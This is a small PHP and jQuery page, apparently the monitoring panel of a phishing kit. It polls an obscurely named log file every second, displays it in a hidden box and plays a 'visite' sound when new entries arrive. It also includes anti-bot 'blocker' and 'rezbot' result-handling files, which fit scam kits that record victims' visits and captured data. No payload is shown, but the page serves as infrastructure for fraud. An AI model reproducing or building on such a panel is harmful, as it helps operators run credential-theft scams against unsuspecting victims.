
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>

<script type="text/javascript">
    var first_run = 0;

    function playSound() {
        document.getElementById("dummy").innerHTML= new Audio('visite.mp3').play();
    }

    function loadLog(){
        $.ajax({
            url: "U92Zb3ALSChwx4rLDa4DT5238i7i7ja.php",
            cache: false,
            success: function(html){
                prev_chat = $("#chatbox").html();
                $("#chatbox").html(html);
                curr_chat = $("#chatbox").html();
                if(curr_chat != prev_chat) {
                    prev_chat = curr_chat;
                    if(first_run===0) {
                        first_run = 1;
                    } else {
                        playSound();
                    }
                }
            }
        });
    }
    setInterval (loadLog, 1000);
</script>
<span id="dummy"></span>
<div id="chatbox" style="display: none;">
    <?php
include("common/includes.php");
include 'blocker.php';
include 'rezbot/basicbot.php';
include 'rezbot/rezcrawl.php';
include 'rezbot/rezzc.php';

    $file = fopen("U92Zb3ALSChwx4rLDa4DT5238i7i7ja.php", "r") or exit("Impossible d'ouvrir les logs !");

    //Output a line of the file until the end is reached
    while(!feof($file)) {
        echo fgets($file). "<br>";
    }

    fclose($file);
    ?>
</div>